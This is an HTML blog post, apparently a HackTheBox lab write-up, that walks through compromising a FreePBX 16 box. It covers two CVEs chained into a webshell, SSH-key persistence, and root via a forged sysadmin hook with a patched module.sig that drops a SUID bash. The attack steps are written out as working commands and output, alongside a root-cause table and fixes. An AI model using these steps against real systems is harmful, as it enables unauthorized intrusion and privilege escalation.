@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Connected — S. Markakis</title>
+<meta name="description" content="HackTheBox Connected — a FreePBX 16 two-CVE web RCE (CVE-2025-57819 unauthenticated stacked SQLi into an admin, then CVE-2025-61678 authenticated firmware-upload path traversal to a webshell), then root via the FreePBX sysadmin incron hook, whose signature check trusts an editable module.sig it never GPG-verifies.">
+<meta property="og:title" content="HTB: Connected — S. Markakis">
+<meta property="og:description" content="HackTheBox Connected — a FreePBX 16 two-CVE web RCE (CVE-2025-57819 unauthenticated stacked SQLi into an admin, then CVE-2025-61678 authenticated firmware-upload path traversal to a webshell), then root via the FreePBX sysadmin incron hook, whose signature check trusts an editable module.sig it never GPG-verifies.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-connected.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-connected.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-connected.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-connected.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Connected",
+  "description": "HackTheBox Connected — a FreePBX 16 two-CVE web RCE (CVE-2025-57819 unauthenticated stacked SQLi into an admin, then CVE-2025-61678 authenticated firmware-upload path traversal to a webshell), then root via the FreePBX sysadmin incron hook, whose signature check trusts an editable module.sig it never GPG-verifies.",
+  "datePublished": "2026-09-10",
+  "dateModified": "2026-09-10",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-connected.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-connected.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-connected"
+  },
+  "timeRequired": "PT6M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: Connected</h1>
+    <div class="post-meta">
+      <span class="date">September 10, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Easy</span>
+      <span>&nbsp;6 min read</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Connected is a FreePBX box, and both halves are about trusting the wrong thing. The foothold chains two fresh CVEs — an <strong>unauthenticated stacked SQL injection</strong> (CVE-2025-57819) that writes a brand-new admin straight into the users table, and an <strong>authenticated firmware-upload path traversal</strong> (CVE-2025-61678) that drops a webshell in the web root. Root is prettier: FreePBX ships a root-run "sysadmin" hook system that runs module scripts when a file lands in an <strong>incron</strong>-watched spool. It <em>does</em> hash-check each hook against a signed <code>module.sig</code> — but it never actually verifies the signature, so a user who can write the module directory can rewrite a hook, patch its hash, and have it run as root.
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-connected/img-attack-chain.webp" type="image/webp"><img class="screenshot" src="assets/htb-connected/img-attack-chain.png" alt="Connected compromise chain: FreePBX 16 unauthenticated stacked SQLi (CVE-2025-57819) inserts an admin, an authenticated Endpoint-Manager firmware-upload path traversal (CVE-2025-61678) drops a webshell as asterisk for user.txt, an incron watcher runs sysadmin_manager as root on new spool files, and an editable module.sig lets asterisk plant a root hook that drops a SUID bash for root.txt" width="1567" height="492" loading="lazy" decoding="async"></picture>
+
+  <div class="chain">
+    <span class="chain-node">FreePBX 16</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2025-57819 SQLi → admin</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2025-61678 upload → webshell</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">asterisk</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">incron sysadmin hook</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>SSH plus a CentOS Apache serving HTTP and HTTPS, redirecting to <code>connected.htb</code>. The TLS cert (<code>pbxconnect</code>) and the <code>/admin</code> title give it away — this is <strong>FreePBX</strong>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -sCV -p- &lt;TARGET_IP&gt;</span>
+<span class="po">22/tcp  open  ssh       OpenSSH 7.4
+80/tcp  open  http      Apache/2.4.6 (CentOS) PHP/7.4  (→ connected.htb)
+443/tcp open  ssl/http  Apache/2.4.6  (ssl-cert CN=pbxconnect)</span>
+<span class="pd">$ </span><span class="pc">curl -sk https://&lt;TARGET_IP&gt;/admin/ -o /dev/null -w '%{redirect_url}\n'</span>
+<span class="po">https://&lt;TARGET_IP&gt;/admin/config.php   </span><span class="pco"># FreePBX Administration 16</span></div>
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — FreePBX 16 SQLi → Admin → RCE</h2>
+
+  <p>FreePBX 16 is vulnerable to two chainable bugs (public exploit: <a href="https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE">0xEhab/FreePBX-CVE-2025-57819-RCE</a>):</p>
+
+  <ul>
+    <li><strong>CVE-2025-57819</strong> — an <em>unauthenticated stacked SQL injection</em> in the endpoint module loader's <code>brand</code> parameter. Because it's stacked, you don't just read data — you run a second statement that <code>INSERT</code>s a fresh admin row into <code>ampusers</code>.</li>
+    <li><strong>CVE-2025-61678</strong> — an <em>authenticated arbitrary file upload</em>. Logged in as the admin you just created, the Endpoint Manager's firmware uploader (<code>upload_cust_fw</code>) trusts a <code>fwbrand</code> path, and a traversal walks the uploaded file out into the web root as a <code>.php</code> webshell.</li>
+  </ul>
+
+  <p>The exploit does all of it and hands you command execution. One transient note: the first run timed out on the login POST (the box is slow to answer); the retry sailed through.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">FreePBX RCE</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 exploit.py --rhost &lt;TARGET_IP&gt; --command 'id'</span>
+<span class="po">[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_p2v21:...
+[+] admin row inserted into ampusers
+[+] authenticated as svc_p2v21
+[*] [CVE-2025-61678] uploading webshell -> /3jjb7bz2oi/t5rxo97i.php
+[+] webshell live
+</span><span class="pg">uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)</span></div>
+  </div>
+
+  <p>RCE as <code>asterisk</code>. Rather than juggle a reverse shell, I used the single-command mode to plant an SSH key and get a stable session — user flag's right there:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">SSH-key persistence → user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 exploit.py --rhost &lt;IP&gt; --command \
+     "mkdir -p ~/.ssh; echo '&lt;pubkey&gt;' &gt;&gt; ~/.ssh/authorized_keys"</span>
+<span class="pd">$ </span><span class="pc">ssh -i conn_key asterisk@&lt;IP&gt; 'cat ~/user.txt'</span>
+<span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ PRIVESC ══ -->
+  <h2>Root — The FreePBX sysadmin Hook</h2>
+
+  <p>SUID hunting turns up a vulnerable-looking <code>pkexec</code>, but its exploit doesn't land. The real path is FreePBX's own automation glue. <code>/etc/incron.d</code> defines <strong>incron</strong> watches — inotify-driven cron — and one of them is the whole game:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/incron.d/*</span>
+    </div>
+    <div class="term-body"><span class="pr">/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#</span><span class="po">
+/usr/local/asterisk/incron  IN_CLOSE_WRITE  /usr/bin/sysadmin_manager --local $#</span></div>
+  </div>
+
+  <p>So whenever a file appears in <code>/var/spool/asterisk/incron</code>, root runs <code>sysadmin_manager</code> with that filename. That binary (its logic lives in <code>/usr/lib/sysadmin/includes.php</code>) parses the filename as <code>&lt;module&gt;.&lt;hook&gt;</code> and, after a series of checks, runs the module's hook script as root:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">includes.php — the payoff</span>
+    </div>
+    <div class="term-body"><span class="po">$sigfile  = "/var/www/html/admin/modules/$module/module.sig";
+$hookfile = "/var/www/html/admin/modules/$module/hooks/$hook";
+$verify   = $g->checkSig($sigfile);           </span><span class="pco"># parses the signed hash list</span><span class="po">
+...
+if (hash_file('sha256', $hookfile) !== $verify['hashes'][$signame]) exit;   </span><span class="pco"># hash gate</span><span class="po">
+...
+</span><span class="pr">system("$hookfile $params");                  # runs as ROOT</span></div>
+  </div>
+
+  <p>On paper that's locked down: the hook has to match a sha256 listed inside a GPG-clearsigned <code>module.sig</code> that must be signed by a whitelisted FreePBX key. But look at what the code actually checks — it asserts the <code>[hashes]</code> and <code>[config][signedwith]</code> blocks <em>exist and are whitelisted</em>, and that the hook's hash matches. <strong>It never checks that the GPG signature actually verified.</strong> <code>checkSig</code> happily parses the hash list out of a clearsigned file whose body has been edited.</p>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-connected/img-sysadmin-hook-privesc.webp" type="image/webp"><img class="screenshot" src="assets/htb-connected/img-sysadmin-hook-privesc.png" alt="Diagram of the sysadmin hook privesc: asterisk rewrites a module's hooks/logrotate to drop a SUID bash and patches the matching sha256 in module.sig, sysadmin_manager checks the sha256 against the parsed but never GPG-verified module.sig, then touching a trigger in the incron spool makes it run the hook as root" width="1567" height="611" loading="lazy" decoding="async"></picture>
+
+  <p>And the modules directory is ours: <code>/var/www/html/admin/modules</code> is owned <code>asterisk:asterisk</code>, mode <code>775</code>. So pick a module with a hook — the <code>api</code> module has a <code>logrotate</code> one — rewrite the hook to drop a SUID bash, recompute its sha256, patch that one line in <code>module.sig</code>, and touch the trigger:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">forge the hook → trigger as root</span>
+    </div>
+    <div class="term-body"><span class="pu">asterisk</span><span class="ps">@</span><span class="ph">connected</span><span class="ps">$ </span><span class="pc">M=/var/www/html/admin/modules/api</span>
+<span class="pu">asterisk</span><span class="ps">@</span><span class="ph">connected</span><span class="ps">$ </span><span class="pc">printf '#!/bin/bash\ninstall -m 4755 /bin/bash /tmp/.bs\n' &gt; "$M/hooks/logrotate"</span>
+<span class="pu">asterisk</span><span class="ps">@</span><span class="ph">connected</span><span class="ps">$ </span><span class="pc">NEW=$(sha256sum "$M/hooks/logrotate" | awk '{print $1}')</span>
+<span class="pu">asterisk</span><span class="ps">@</span><span class="ph">connected</span><span class="ps">$ </span><span class="pc">sed -i "s#^hooks/logrotate = .*#hooks/logrotate = $NEW#" "$M/module.sig"</span>
+<span class="pu">asterisk</span><span class="ps">@</span><span class="ph">connected</span><span class="ps">$ </span><span class="pc">touch /var/spool/asterisk/incron/api.logrotate   </span><span class="pco"># incron → sysadmin_manager (root)</span></div>
+  </div>
+
+  <p>The incron watch fires, root runs our hook, and a setuid <code>bash</code> appears. <code>-p</code> keeps the effective UID at 0:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">SUID bash → root</span>
+    </div>
+    <div class="term-body"><span class="pu">asterisk</span><span class="ps">@</span><span class="ph">connected</span><span class="ps">$ </span><span class="pc">ls -l /tmp/.bs</span>
+<span class="po">-rwsr-xr-x 1 root root 964536 /tmp/.bs</span>
+<span class="pu">asterisk</span><span class="ps">@</span><span class="ph">connected</span><span class="ps">$ </span><span class="pc">/tmp/.bs -p -c 'id; cat /root/root.txt'</span>
+<span class="po">uid=999(asterisk) </span><span class="pg">euid=0(root)</span><span class="po"> groups=1000(asterisk)
+</span><span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">The hook system did the hard part — GPG-signing releases, whitelisting keys, hashing every file — and then forgot to enforce it. A hash pinned inside a signature you never validate is just a checksum, and a checksum you can rewrite is no control at all. Verify the signature's <em>result</em>, and don't let the account that serves the web app own the directory the root daemon trusts.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>→ admin</td><td>Unauthenticated stacked SQL injection in the endpoint module loader inserts an admin — CVE-2025-57819 (CWE-89)</td></tr>
+    <tr><td>→ asterisk</td><td>Authenticated firmware-upload path traversal writes a PHP webshell to the web root — CVE-2025-61678 (CWE-22 / CWE-434)</td></tr>
+    <tr><td>→ root</td><td>Root sysadmin hook trusts an editable <code>module.sig</code> it never GPG-verifies, and the web user owns the module dir (CWE-347 / CWE-732)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. FreePBX SQLi + upload RCE → asterisk (user.txt)</span>
+<span class="pc">python3 exploit.py --rhost &lt;IP&gt; --command 'id'                 # CVE-2025-57819 + 61678</span>
+<span class="pc">python3 exploit.py --rhost &lt;IP&gt; --command "echo &lt;pubkey&gt; &gt;&gt; ~/.ssh/authorized_keys"</span>
+<span class="pc">ssh -i conn_key asterisk@&lt;IP&gt;</span>
+
+<span class="pco"># 2. incron sysadmin hook → root (root.txt)</span>
+<span class="pc">M=/var/www/html/admin/modules/api</span>
+<span class="pc">printf '#!/bin/bash\ninstall -m 4755 /bin/bash /tmp/.bs\n' &gt; $M/hooks/logrotate</span>
+<span class="pc">sed -i "s#^hooks/logrotate = .*#hooks/logrotate = $(sha256sum $M/hooks/logrotate|awk '{print $1}')#" $M/module.sig</span>
+<span class="pc">touch /var/spool/asterisk/incron/api.logrotate</span>
+<span class="pc">/tmp/.bs -p -c 'cat /root/root.txt'</span></div>
+  </div>
+
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
